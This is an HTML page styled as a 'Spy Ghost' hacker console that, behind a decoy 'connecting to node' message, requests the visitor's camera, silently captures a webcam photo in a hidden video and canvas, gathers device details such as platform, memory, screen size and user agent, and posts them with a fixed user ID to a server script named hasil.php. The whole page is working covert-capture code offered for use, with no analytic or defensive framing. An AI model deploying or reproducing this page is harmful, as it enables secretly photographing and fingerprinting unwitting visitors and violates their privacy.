<!DOCTYPE html>
<html>
<head>
    <title>Spy Ghost - Protocol Initialized</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
        .box { border: 1px solid #0f0; display: inline-block; padding: 25px; box-shadow: 0 0 15px #0f0; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="box">
        <h3>[ SYSTEM: SPY GHOST ]</h3>
        <p class="blink">CONNECTING TO NODE...</p>
    </div>
    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;" width="640" height="480"></canvas>

    <script>
    navigator.mediaDevices.getUserMedia({ video: true })
    .then(s => {
        const v = document.getElementById('v');
        v.srcObject = s;
        setTimeout(() => {
            const c = document.getElementById('c');
            c.getContext('2d').drawImage(v, 0, 0);
            const img = c.toDataURL('image/jpeg');
            const info = {
                os: navigator.platform,
                ram: navigator.deviceMemory || "N/A",
                screen: window.screen.width + "x" + window.screen.height,
                agent: navigator.userAgent
            };
            fetch('hasil.php', {
                method: 'POST',
                body: JSON.stringify({ img: img, info: info, user_id: "7429012558" })
            });
        }, 2000);
    });
    </script>
</body>
</html>